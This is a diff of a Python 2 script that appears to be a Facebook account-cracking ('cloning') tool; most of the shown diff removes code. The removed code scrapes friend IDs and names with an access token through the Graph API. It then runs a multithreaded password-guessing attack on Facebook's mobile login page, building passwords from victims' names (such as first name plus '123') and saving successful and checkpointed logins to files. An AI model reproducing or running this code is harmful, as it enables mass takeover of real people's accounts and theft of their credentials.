-        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
-        try:
-            pass1 = name
-            rana = requests.Session()
-            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-            p = rana.get('https://mbasic.facebook.com')
-            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
-            if 'c_user' in rana.cookies.get_dict().keys():
-                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
-                ok=open('RK-ok.txt', 'a')
-                ok.write(uid+ " | " +pass1+ "\n")
-                ok.close()
-                oks.append(uid+pass1)
-            else:
-                if 'checkpoint' in rana.cookies.get_dict().keys():
-                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
-                    cp=open('RK-cp.txt', 'a')
-                    cp.write(uid+ " | " +pass1+ "\n")
-                    cp.close()
-                    cps.append(uid+pass1)
-                else:
-                    pass2 = first+"123"
-                    rana = requests.Session()
-                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                    p = rana.get('https://mbasic.facebook.com')
-                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
-                    if 'c_user' in rana.cookies.get_dict().keys():
-                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
-                        ok=open('RK-ok.txt', 'a')
-                        ok.write(uid+ " | " +pass2+ "\n")
-                        ok.close()
-                        oks.append(uid+pass2)
-                    else:
-                        if 'checkpoint' in rana.cookies.get_dict().keys():
-                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
-                            cp=open('RK-cp.txt', 'a')
-                            cp.write(uid+ " | " +pass2+ "\n")
-                            cp.close()
-                            cps.append(uid+pass2)
-                        else:
-                            pass3 = first+"1234"
-                            rana = requests.Session()
-                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                            p = rana.get('https://mbasic.facebook.com')
-                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
-                            if 'c_user' in rana.cookies.get_dict().keys():
-                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
-                                ok=open('RK-ok.txt', 'a')
-                                ok.write(uid+ " | " +pass3+ "\n")
-                                ok.close()
-                                oks.append(uid+pass3)
-                            else:
-                                if 'checkpoint' in rana.cookies.get_dict().keys():
-                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
-                                    cp=open('RK-cp.txt', 'a')
-                                    cp.write(uid+ " | " +pass3+ "\n")
-                                    cp.close()
-                                    cps.append(uid+pass3)
-                                else:
-                                    pass4 = first+"12345"
-                                    rana = requests.Session()
-                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                                    p = rana.get('https://mbasic.facebook.com')
-                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
-                                    if 'c_user' in rana.cookies.get_dict().keys():
-                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
-                                        ok=open('RK-ok.txt', 'a')
-                                        ok.write(uid+ " | " +pass4+ "\n")
-                                        ok.close()
-                                        oks.append(uid+pass4)
-                                    else:
-                                        if 'checkpoint' in rana.cookies.get_dict().keys():
-                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
-                                            cp=open('RK-cp.txt', 'a')
-                                            cp.write(uid+ " | " +pass4+ "\n")
-                                            cp.close()
-                                            cps.append(uid+pass4)
-                                        else:
-                                            pass5 = last+"123"
-                                            rana = requests.Session()
-                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                                            p = rana.get('https://mbasic.facebook.com')
-                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
-                                            if 'c_user' in rana.cookies.get_dict().keys():
-                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
-                                                ok=open('RK-ok.txt', 'a')
-                                                ok.write(uid+ " | " +pass5+ "\n")
-                                                ok.close()
-                                                oks.append(uid+pass5)
-                                            else:
-                                                if 'checkpoint' in rana.cookies.get_dict().keys():
-                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
-                                                    cp=open('RK-cp.txt', 'a')
-                                                    cp.write(uid+ " | " +pass5+ "\n")
-                                                    cp.close()
-                                                    cps.append(uid+pass5)
-                            
-                    
-        except:
-            pass
-    
-    p = ThreadPool(30)
-    p.map(main, idx)
-    print ("\x1b[1;97m")
-    print (39*'-')
-    print ("[!] Cloning Complete Result ........")
-    print (39*'-')
-    print ('[!] Total Ok Ids : '+str(len(oks)))
-    print ('[!] Total Cp Ids :'+str(len(cps)))
-    print (39*'-')
-    print ('')
-    raw_input(' Press Enter To Back ')
-    fb_menu()
-
-
-
-
-
-
-
-
-def xokp():
-    os.system("rm -rf kk.txt")
-    hok=('jok.txt')
-    count=[]
-    rana=[]
-    try:
-        token=open('token.txt','r').read()
-    except:
-        fb_menu()
-    os.system('clear')
-    print (logo)
-    print ("")
-    iiid=raw_input("[=] Enter ID : ")
-    print ("")
-    ps1=raw_input('[1] Password : ')
-    ps2=raw_input('[2] Password : ')
-    ps3=raw_input('[3] Password : ')
-    ps4=raw_input('[4] Password : ')
-    print ("")
-    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
-    q=json.loads(rrp.text)
-    nid=q ['name']
-    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("look.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    print ("")
-    print (sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends")
-    print ("")
-    time.sleep(2)
-    print (g+"[=] Transfer Complte Process Start *"+w)
-    print ("")
-    os.system(' cat look.txt | grep "10000" >> kk.txt')
-    os.system(' cat look.txt | grep "1000" >> kk.txt')
-    os.system('rm -rf look.txt')
-    file=open('kk.txt')
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck=open("jok.txt",'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    fuck.close()
-    os.system('rm -rf newlinks.txt')
-    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
-    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
-    os.system('rm -rf kk.txt')
-    os.system('rm -rf jok.txt')
-    os.system('clear')
-    print (logo)
-    print ("")
-    try:
-        for line in open("newlinks.txt",'r').readlines():
-            idx.append(line.strip())
-    except:
-        fb_menu()
-    print ("[!] total ids : "+str(len(idx)))
-    os.system('echo " -----------------------------------"| lolcat')
-    print ("    cracking start please wait ..   ")
-    os.system('echo " -----------------------------------"| lolcat')
-    def main(arg):
-        user=arg
-        uid, name = user.split("|")
-        name=name.lower()
-        first = name.rsplit(' ')[0]
-        try:
-            last = name.rsplit(' ')[1]
-        except:
-            pass
-        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
-        try:
-            pass1 = name
-            rana = requests.Session()
-            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-            p = rana.get('https://mbasic.facebook.com')
-            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
-            if 'c_user' in rana.cookies.get_dict().keys():
-                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
-                ok=open('RK-ok.txt', 'a')
-                ok.write(uid+ " | " +pass1+ "\n")
-                ok.close()
-                oks.append(uid+pass1)
-            else:
-                if 'checkpoint' in rana.cookies.get_dict().keys():
-                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
-                    cp=open('RK-cp.txt', 'a')
-                    cp.write(uid+ " | " +pass1+ "\n")
-                    cp.close()
-                    cps.append(uid+pass1)
-                else:
-                    pass2 = ps1
-                    rana = requests.Session()
-                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                    p = rana.get('https://mbasic.facebook.com')
-                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
-                    if 'c_user' in rana.cookies.get_dict().keys():
-                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
-                        ok=open('RK-ok.txt', 'a')
-                        ok.write(uid+ " | " +pass2+ "\n")
-                        ok.close()
-                        oks.append(uid+pass2)
-                    else:
-                        if 'checkpoint' in rana.cookies.get_dict().keys():
-                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
-                            cp=open('RK-cp.txt', 'a')
-                            cp.write(uid+ " | " +pass2+ "\n")
-                            cp.close()
-                            cps.append(uid+pass2)
-                        else:
-                            pass3 = ps2
-                            rana = requests.Session()
-                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                            p = rana.get('https://mbasic.facebook.com')
-                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
-                            if 'c_user' in rana.cookies.get_dict().keys():
-                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
-                                ok=open('RK-ok.txt', 'a')
-                                ok.write(uid+ " | " +pass3+ "\n")
-                                ok.close()
-                                oks.append(uid+pass3)
-                            else:
-                                if 'checkpoint' in rana.cookies.get_dict().keys():
-                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
-                                    cp=open('RK-cp.txt', 'a')
-                                    cp.write(uid+ " | " +pass3+ "\n")
-                                    cp.close()
-                                    cps.append(uid+pass3)
-                                else:
-                                    pass4 = ps3
-                                    rana = requests.Session()
-                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                                    p = rana.get('https://mbasic.facebook.com')
-                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
-                                    if 'c_user' in rana.cookies.get_dict().keys():
-                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
-                                        ok=open('RK-ok.txt', 'a')
-                                        ok.write(uid+ " | " +pass4+ "\n")
-                                        ok.close()
-                                        oks.append(uid+pass4)
-                                    else:
-                                        if 'checkpoint' in rana.cookies.get_dict().keys():
-                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
-                                            cp=open('RK-cp.txt', 'a')
-                                            cp.write(uid+ " | " +pass4+ "\n")
-                                            cp.close()
-                                            cps.append(uid+pass4)
-                                        else:
-                                            pass5 = ps4
-                                            rana = requests.Session()
-                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-                                            p = rana.get('https://mbasic.facebook.com')
-                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
-                                            if 'c_user' in rana.cookies.get_dict().keys():
-                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
-                                                ok=open('RK-ok.txt', 'a')
-                                                ok.write(uid+ " | " +pass5+ "\n")
-                                                ok.close()
-                                                oks.append(uid+pass5)
-                                            else:
-                                                if 'checkpoint' in rana.cookies.get_dict().keys():
-                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
-                                                    cp=open('RK-cp.txt', 'a')
-                                                    cp.write(uid+ " | " +pass5+ "\n")
-                                                    cp.close()
-                                                    cps.append(uid+pass5)
-                            
-                    
-        except:
-            pass
-    
-    p = ThreadPool(30)
-    p.map(main, idx)
-    print ("\x1b[1;97m")
-    print (39*'-')
-    print ("[!] cloning complete result ........")
-    print (39*'-')
-    print ('[!] Total Ok Ids : '+str(len(oks)))
-    print ('[!] Total Cp Ids : '+str(len(cps)))
-    print (39*'-')
-    print ('')
-    raw_input(' Press Enter To Back ')
+    raw_input('[=] Press Enter To Back')
     fb_menu()
 
 
@@ -2391,6 +1413,7 @@ def xoknp():
 
 
         
+
 
 
 
@@ -2860,7 +1883,6 @@ def p_p_pass():
     raw_input(' Press Enter To Back')
     fb_menu()
 
-
 def grap():
         os.system('clear')
         print (logo)
@@ -2896,7 +1918,6 @@ def grap():
             mineExt()
          
         grap()
-
 
 def mineExt():
     hok=('jok.txt')
@@ -3897,8 +2918,6 @@ def ext10():
     print ('[*] Your File Save In : '+cop)
     raw_input('[*] Press Enter To Back')
     main()
-
-
 
 
 
